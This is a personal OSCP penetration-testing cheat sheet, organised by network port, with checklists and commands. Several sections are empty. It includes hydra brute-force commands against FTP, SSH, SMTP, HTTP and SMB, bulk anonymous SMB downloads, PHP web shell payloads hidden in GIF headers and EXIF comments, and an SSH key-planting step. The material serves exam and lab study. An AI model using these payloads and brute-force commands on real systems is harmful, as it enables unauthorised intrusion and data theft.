# OSCP-CheatSheet

c1inton's OSCP CheatSheet.

  - [Port](#port)
    - [21-FTP](#21-ftp)
    - [22-SSH](#22-ssh)
    - [25-SMTP](#25-smtp)
    - [80/443-HTTP(S)](#80443-https)
      - [Web Enumration](#web-enumeration)
      - [SQL Injection](#sql-injection)
      - [No-SQL Injection](#no-sql-injection)
      - [XML External Entities (XXE)](#xml-external-entities-xxe)
      - [Cross-site Scripting (XSS)](#cross-site-scripting-xss)
      - [File Inclusion (LFI/RFI)](#file-inclusion-lfirfi)
      - [Server-side Request forgery (SSRF)](#server-side-request-forgery-ssrf)
      - [File Upload](#file-upload)
    - [88-KERBEROS](#88-kerberos)
    - [110-POP3](#110-pop3)
    - [111-NFS/RPC](#111-nfsrpc)
  - [Linux Privilege Escalation](#linux-privilege-escalation)
  - [Windows Privilege Escalation](#windows-privilege-escalatio)
  - [Useful Commands](#useful-commands)
    - [File Transfer](#file-transfer)
    - [Reverse Shell](#reverse-shell)
    - [Shell Spawning](#shell-spawning)
  - [Buffer Overflow](#buffer-overflow)


## Port
### 21-FTP
- [ ] Check if you have anonymous access
- [ ] Check if you can upload a file to trigger a webshell through the webapp
- [ ] Check if you can download backup files to extract included passwords
- [ ] Check the version of FTP for exploits
```bash
ftp $ip

#Brute force
hydra -V -f -L username.txt -P password.txt ftp://$ip -u -vV 
```
### 22-SSH
- [ ] Try easy username-password combinations
- [ ] Check for username enumeration vulnerabilities
- [ ] Check version for vulnerabilities
- [ ] (Only when getting desperate) Try brute force with Hydra, Medussa, ...
```bash
ssh $user@$ip
ssh $user@$ip -i user.key

#Brute force
hydra -v  -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 $ip ssh
hydra -l gibson -P /tmp/alpha.txt -T 20 $ip ssh

#SSH key file
/home/user/.ssh/id_rsa
/home/user/.ssh/authorized_keys
```
### 25-SMTP
- [ ] Check for user enumeration
- [ ] Check version for exploits
- [ ] Check for null sessions
```bash
telnet $ip 25

#Enumeration
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip

#Brute force
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
```
### 80/443-HTTP(S)
- [ ] Login portals 
    - [ ] try the default credentials off the application
    - [ ] try usernames already seen throughout the application or in other services like SMTP
    - [ ] try SQL injection bypasses
    - [ ] try registering a new user
    - [ ] brute force with hydra, medusa, ...
- [ ] Inspect page content, HTTP header, ...
- [ ] Check robots.txt for hidden directories
- [ ] Brute force directories to find hidden content
- [ ] Check for passwords/URLs/versions/... in comments of web app
- [ ] Check version numbers for known exploits
    - [ ] Check changelog for version information
    - [ ] Estimate version based on copyright date (if not automatically adjusted)
- [ ] Check if specific CMS is used like WordPress and then use platform specific scanners 
- [ ] ways to RCE 
  - [ ] check for file upload functionalities (if uploads are filtered, try alternative extensions)
  - [ ] execute commands through SQLi 
  - [ ] Shellshock
  - [ ] command injection
  - [ ] trigger injected code through path traversal

#### Web Enumeration
```bash
#Brute force directory
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,asp,aspx -u $url
dirb $url -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  

#Extension set
sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar
ext~,ext.bak,ext.tmp,ext.old,bak,tmp,old

#Brute force login
hydra -L username.txt -P password.txt -f $ip http-get /manager/html -vV -u
hydra $ip http-post-form "/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid" -P /usr/share/wordlists/rockyou.txt -l admin

#Webdav
davtest --url $url

#CMS Scanner
wpscan --url $ip/wp/
droopescan scan drupal -u $url -t 32
joomscan -u $ip
```
#### SQL injection

#### No-SQL injection

#### XML External Entities (XXE)

#### Cross-site Scripting (XSS)
#### File Inclusion (LFI/RFI)
```bash


#Payload all the things
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
```
#### Server-side Request forgery (SSRF)
```bash


#Payload all the things

```

#### File Upload
```bash
#Extension set
php - phtml, .php, .php3, .php4, .php5, .Php, .pHp, phP, .php.jpg and .inc
asp - asp, .aspx
perl - .pl, .pm, .cgi, .lib
jsp - .jsp, .jspx, .jsw, .jsv, and .jspf
Coldfusion - .cfm, .cfml, .cfc, .dbm

#GIF89a
GIF89a;            
<?            
system($_GET['cmd']);//or you can insert your complete shell code            
?>

#Exiftool
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>'

#Payload all the things
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
```
### 88-KERBEROS
```bash
https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
```
### 110-POP3
- [ ] Check version for exploits
- [ ] Check mails for the presence of credentials
```bash
telnet $ip 110
list
retr $number
```

### 111-NFS/RPC
- [ ] Check for passwords in files on mountable drives
```bash
rpcinfo -p $ip
showmount -e $ip
```

### 139/445-SMB
- [ ] Check for null sessions
- [ ] Check the permissions of users you already have
- [ ] Check for passwords in files
- [ ] Attempt brute force on enumerated users
- [ ] Check for EternalBlue
- [ ] Check samba version (if Linux)
```bash
smbclient //$ip//path

#Anonymous login
smbclient  //$ip/path -U " "%" "

#Download all file 
smbclient  //$ip/path -U " "%" " -c "prompt OFF;recurse ON;mget *"

#Mount all file
sudo mount -t cifs -o 'username= ,password= ' //$ip/path /tmp

#Brute force
hydra -L username.txt -P password.txt $ip smb -V -f
```
### 161-SNMP
- [ ] Try the default community strings 'public' and 'private'
- [ ] Enumerate version of OS/ users /processes
```bash

```
## Linux Privilege Escalation

## Windows Privilege Escalation

## Useful Commands
### File Transfer

### Reverse Shell

### Shell Spawning

### SSH to Forward Port
```bash
----host----
ssh-keygen
copy content key.pub
----target----
echo "key.pub content" > ~/.ssh/authirized_keys
chmod 600 ~/.ssh/authirized_keys
----host----
ssh -i key -L port:127.0.0.1:port root@host
```

## Buffer Overflow

windows kernel exploits
https://github.com/SecWiki/windows-kernel-exploits

export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

```python
#test
s = "Python syntax highlighting"
print s
```

